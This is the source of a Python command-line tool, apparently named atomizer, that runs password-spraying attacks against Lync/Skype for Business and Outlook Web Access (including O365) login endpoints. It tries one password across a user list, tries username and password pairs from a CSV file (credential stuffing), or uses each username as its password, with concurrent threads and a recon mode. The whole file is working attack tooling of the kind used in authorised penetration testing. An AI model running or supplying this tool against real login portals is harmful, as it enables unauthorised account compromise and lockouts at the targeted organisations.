#! /bin/env python3

"""
Usage:
    atomizer (lync|owa) <target> <password> --userfile USERFILE [--threads THREADS] [--debug]
    atomizer (lync|owa) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--threads THREADS] [--debug]
    atomizer (lync|owa) <target> --user-as-pass USERFILE [--threads THREADS] [--debug]
    atomizer (lync|owa) <target> --recon [--debug]
    atomizer -h | --help
    atomizer -v | --version

Arguments:
    target     target domain or url
    password   password to spray

Options:
    -h, --help               show this screen
    -v, --version            show version
    -u, --userfile USERFILE  file containing usernames (one per line)
    -c, --csvfile CSVFILE    csv file containing usernames and passwords
    -t, --threads THREADS    number of concurrent threads to use [default: 3]
    -d, --debug              enable debug output
    --recon                  only collect info, don't password spray
    --user-row-name NAME     username row title in CSV file [default: Email Address]
    --pass-row-name NAME     password row title in CSV file [default: Password]
    --user-as-pass USERFILE  use the usernames in the specified file as the password
"""

import logging
import signal
import asyncio
import concurrent.futures
import sys
import csv
from functools import partial
from pathlib import Path
from docopt import docopt
from core.utils.messages import *
from core.sprayers import Lync, OWA


class Atomizer:
    def __init__(self, loop, target, threads=3, debug=False):
        self.loop = loop
        self.target = target
        self.sprayer = None
        self.threads = int(threads)
        self.debug = debug

        log_format = '%(threadName)10s %(name)18s: %(message)s' if debug else '%(message)s'

        logging.basicConfig(
            level=logging.DEBUG if debug else logging.INFO,
            format=log_format,
            stream=sys.stderr,
        )

        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads,
        )

    def lync(self):
        self.sprayer = Lync(
            target=self.target
        )

    def owa(self):
        self.sprayer = OWA(
            target=self.target
        )

    async def atomize(self, userfile, password):
        log = logging.getLogger('atomize')
        log.debug('atomizing...')

        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth

        log.debug('creating executor tasks')
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=password))
            for username in userfile
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    async def atomize_csv(self, csvreader: csv.DictReader, user_row_name='Email Address', pass_row_name='Password'):
        log = logging.getLogger('atomize_csv')
        log.debug('atomizing...')

        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth

        log.debug('creating executor tasks')
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(auth_function, username=row[user_row_name], password=row[pass_row_name]))
            for row in csvreader
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    async def atomize_user_as_pass(self, userfile):
        log = logging.getLogger('atomize_user_as_pass')
        log.debug('atomizing...')

        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth

        log.debug('creating executor tasks')
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=username.strip().split('\\')[-1:][0]))
            for username in userfile
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    def shutdown(self):
        self.sprayer.shutdown()


if __name__ == "__main__":
    args = docopt(__doc__, version="0.0.1dev")
    loop = asyncio.get_event_loop()

    atomizer = Atomizer(
        loop=loop,
        target=args['<target>'].lower(),
        threads=args['--threads'],
        debug=args['--debug']
    )

    logging.debug(args)

    for input_file in [args['--userfile'], args['--csvfile'], args['--user-as-pass']]:
        if input_file:
            file_path = Path(input_file)
            if not file_path.exists() or not file_path.is_file():
                logging.error(print_bad("Path to --userfile/--csvfile/--user-as-pass invalid!"))
                sys.exit(1)

    if args['lync']:
        atomizer.lync()
    elif args['owa']:
        atomizer.owa()

    if not args['--recon']:
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, atomizer.shutdown)

        if args['--csvfile']:
            with open(args['--csvfile']) as csvfile:
                    reader = csv.DictReader(csvfile)
                    loop.run_until_complete(
                        atomizer.atomize_csv(
                            csvreader=reader,
                            user_row_name=args['--user-row-name'],
                            pass_row_name=args['--pass-row-name']
                        )
                    )

        elif args['--userfile']:
            with open(args['--userfile']) as userfile:
                    loop.run_until_complete(
                        atomizer.atomize(
                            userfile=userfile,
                            password=args['<password>']
                        )
                    )

        elif args['--user-as-pass']:
            with open(args['--user-as-pass']) as userfile:
                    loop.run_until_complete(atomizer.atomize_user_as_pass(userfile))

        atomizer.shutdown()
